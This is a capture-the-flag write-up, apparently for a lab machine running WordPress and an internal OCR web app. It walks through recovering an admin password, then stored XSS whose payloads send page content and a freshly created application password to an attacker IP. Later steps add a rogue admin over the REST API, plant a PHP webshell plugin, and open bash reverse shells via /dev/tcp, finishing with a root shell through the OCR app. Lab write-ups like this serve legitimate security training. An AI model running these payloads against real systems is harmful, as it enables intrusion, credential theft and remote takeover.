# makesense

```
Nmap scan report for 10.129.51.41
Host is up, received echo-reply ttl 63 (0.066s latency).
Scanned at 2026-07-09 22:39:18 EDT for 68s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE     REASON         VERSION
22/tcp   open     ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz4cX4T5eERMWbUEHuFD+1SFwwTAr3tU5E2wQzRQ6m2CzIj/2/fMOU+k/mcyoI0WAXs9PEHIV1H0f+i6JieDRg=
|   256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK7SOmIxHJJ8xGjcGaXoiw/5Y7wL3lR3K0SZvc11DnyQ
80/tcp   filtered http        no-response
443/tcp  open     ssl/http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 31B599F865B5BC751DEDCCDC55ACA0DE
| ssl-cert: Subject: commonName=makesense.htb
| Issuer: commonName=makesense.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-29T16:37:29
| Not valid after:  2126-05-05T16:37:29
| MD5:     137e 40f1 46c6 4920 684e 34dc 3a8e 8887
| SHA-1:   a53c 8772 c319 515b 0b1d 42eb 2327 a5f7 1115 2a61
| SHA-256: 59e3 04ab 3225 c2f6 3984 c784 ad89 508d 0baf 8b57 357b 0b2e d597 21d9 5a5b ead5
| -----BEGIN CERTIFICATE-----
| MIIDEzCCAfugAwIBAgIUR42EgNimQclxF1KIe6qw9biQMRYwDQYJKoZIhvcNAQEL
| BQAwGDEWMBQGA1UEAwwNbWFrZXNlbnNlLmh0YjAgFw0yNjA1MjkxNjM3MjlaGA8y
| MTI2MDUwNTE2MzcyOVowGDEWMBQGA1UEAwwNbWFrZXNlbnNlLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAMAnoA091ROmtJRgwPNyKwQVSUGFbxJe
| yJc2Z7n/Je+8gRC1kE3a2l/OMYUv8nywTAtZINLH5qBrROeiTxuKgR8owzG8cGl1
| yR7qt+V++3mIlPL/PHXUqq1qbVpjOIQMUv+I943I3D+sPIsqOkgBYZIPTbKmGyEp
| IxzC/C/pzyLQ8vsyeEnrHLO4o/vvOcsaM0nSjHGy2nxfRomjydrTGnpJJW6mRHVw
| tZQeYRIhVSJmLzdUZ82c+m9ukK4TjaXCv7uvvTLa6C/QGekAzrIe97EgJiwjg0St
| M6Y/Rvhu86w7bhBW+zsYD12c4XMsL7rkG/xvo8Z/twwIu79NwtisVrUCAwEAAaNT
| MFEwHQYDVR0OBBYEFDxcc9+OiExeUGXr8GW4QgyKFEW2MB8GA1UdIwQYMBaAFDxc
| c9+OiExeUGXr8GW4QgyKFEW2MA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL
| BQADggEBAIt8w+pLWhT1cbnVGIfrzNsomEZmrOmwrXtr7kDedmZ8rEEWm1xfwSJg
| bjxil1DY6II/Mx+735lX8YOjGhEY7TbCILu9Y/ADTJJ2SoPoN8+mpow2qREZU4v8
| 29MZdxjpgu8XIOaG+Ey/y0363YFBvFZA2r+eaa3cl2HfEhgK+FY1V3wiGIytqGmn
| vAHZGf6yqHWVz80KDJqjVr7KqLs8fE9TyUq/ZyALzQaNZmXmy1SVGr925yMCRNKB
| tzywkBy38ImY5001Oy6rMm27hpsspUixpF5GxUJRRwstVvoyl7Z0NIYaDDRzHrvs
| D0QNYd9rk+JXxcZSffNRxk1CNSj0fpM=
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-generator: WordPress 7.0
|_http-title: Agency LLC
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Ubuntu)
8001/tcp filtered vcom-tunnel no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

wordpress site.

there is a function for leaving a voice message to the team or something, and also a contact form.

the page loads a whisper model client-side to summarize + transcribe text. we can find the api in the custom theme at whisper-wrapper.js

enumeration of the wordpress site reveals a forgotten voice message left in the `/wp-content/uploads` directory. it is a testing message from "jake" that has been synthesized and he seems to recite a password? it's hard to make out

luckily the whisper-wrapper includes a "legacy" function to transcribe from a file blob. all we need to do is

```javascript
await whisperTranscriber.init()
await whisperTranscriber.loadModel()

fetch("/wp-content/uploads/2026/01/voice-message.wav")
    .then((r) => r.blob())
    .then((b) => whisperTranscriber.transcribe(b))
    .then((t) => console.log(t))
```

and we get a re-transcription of the original message. messing around with those words at the wp-admin login gets us in, we just need to capitalize the individual words.

we can see the previous contact forms and voice messages sent in the admin panel.

another thing i notice in the whisperTranscriber is there is a function that maps words for symbols to the actual symbol "for XSS injection"

this hinted to me that there is probably xss in the admin panel, and we need to escalate to another account.

turns out we don't need to do any speech shit, we can just do straight xss in the contact form and it'll render in the admin panel, we can just use script tags and include our own resource, let's see if we can catch a bot!

start a netcat listener, serve your malicious js and src it in a script tag:

![xss](/images/makesense/20260710_14h56m46s_grim.png)

```javascript
fetch("http://10.10.14.59:8081",{method:"POST",body: document.documentElement.innerHTML})
```

wait a few seconds...

we do get a response back, in the title bar we can see it's the user "walter". since the bot doesn't follow csp this makes it easy for us

![response](/images/makesense/20260709_20h03m10s_grim.png)

now we have xss in walter's browser, a simple attack is to add an "app password" and give us access to the rest api as walter. but for that we need a nonce. unfortunately we can't just grab it from the page because the bot's nonce refreshes on every fetch, so we need to grab the nonce from the api and pass it directly into the payload. but we do need walter's `user_id`, which i just extracted from the profile.php page

i also grabbed the content from a couple other pages, there is only another admin account, but walter is also admin.

update the script:

```javascript
fetch("/wp-admin/admin-ajax.php?action=rest-nonce")
	.then((r) => r.text())
	.then((nonce) => fetch("/index.php?rest_route=/wp/v2/users/3/application-passwords&_locale=user",{method:"POST",headers:{"X-WP-Nonce": nonce, "Content-Type": "application/x-www-form-urlencoded"},body:"name=pass"}))
	.then((r) => r.text())
	.then((t) => fetch("http://10.10.14.59:8100",{method:"POST",body:t}))
```

![app password](/images/makesense/20260710_14h39m17s_grim.png)

now i just use the api to add a new admin user:

```bash
curl --insecure -X POST --user "walter:$WALT_APP_PWD" "https://makesense.htb/index.php?rest_route=/wp/v2/users" \
-H "Content-Type: application/json" \
-d '{"username": "haze", "email": "haze@example.com", "password": "superawesomeP4SSWORD123!", "roles": ["administrator"]}'
```

with an admin user we can just upload a webshell as a plugin

```php
<?php 
/*
Plugin Name: idk
Plugin URI: https://example.com
Description: shity fuck you
Version: 1.337 
Requires at least: 5.8
Requires PHP: 7.2
Author: haze
Author URI: https://example.com
License: lol
Text Domain: domain
*/

if (isset($_REQUEST["c"])) {
	echo "<pre>";
	system($_REQUEST["c"]);
	echo "</pre>";
}
?>
```

zip it, upload it on the plugins page, then activate the plugin.

then just make such a request to spawn a revshell:

```bash
curl --insecure "https://makesense.htb/wp-content/plugins/shell/shell.php?c=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.59/9001+0>%261'"
```

## privesc

first check the wp-config.php, and there is a db password for mysql (even though it is configured with sqlite) for the user walter, and that password also works for the user on the box -> user flag

- set up ssh access with walter

we can inspec the sqlite db at `/var/www/html/wp-content/database/.ht.sqlite` and get walter+admin's hashes

the hash algo that this version of wordpress uses requires a new hashcat mode that hasn't made it to a release yet, compile hashcat from source and use mode 35500

those hashes don't crack though :(

---

there is an `ocr4` script running as root, `/root/.scripts/start_ocr4.sh` seems to spawn `php -S 127.0.0.1:8001 -t /root/ocr4/`

forward that port w/ ssh so we can see it in a browser

taking a look at that internal service, it uses basic auth but walter's password lets us in. it is a webapp where you can draw text and have the server recognize (ocr) then save it as a text file. im wondering if this gives us file write via path traversal, root ssh access is allowed, we would just need to make an image of our key i guess? and send it b64 encoded to the server

okay we don't have arbitrary write, but we can write files with any extension. another webshell?

you can upload a picture like this, screenshot your webshell and base64 encode it, making sure to escape all the problematic chars. i found also if you try to use single quotes in the aparameter the ocr won't really like it

```bash
curl -c cookies.txt -XPOST --user "walter:$WALT_PWD" "http://localhost:8001" -H "Content-Type: application/x-www-form-urlencoded" \
-d "canvas_image=data%3aimage%2fpng%3bbase64%2c$(base64 -w0 shell.png | sed "s/+/%2b/g;s/\//%2f/g;s/=/%3d/g")" | grep ocr_id
```

then using the ocr_id you get back from the page, save it to a file (they are tied to the php session, so including that cookie is important)

```bash
curl -b cookies.txt -XPOST --user "walter:$WALT_PWD" "http://localhost:8001" -H "Content-Type: application/x-www-form-urlencoded" \
-d 'ocr_id=ocr_6a5161ef462482.75419542&filename=shell.php&save_output=' | grep "notice success reveal"
```

if it works you will see that the file was saved at `saved/shell.php`

now i just use the new webshell to spawn a revshell as root!

```bash
curl --user "walter:$WALT_PWD" "http://localhost:8001/saved/shell.php?c=bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.59/9001+0>%261'"
```

![pwnd](/images/makesense/20260710_14h27m02s_grim.png)

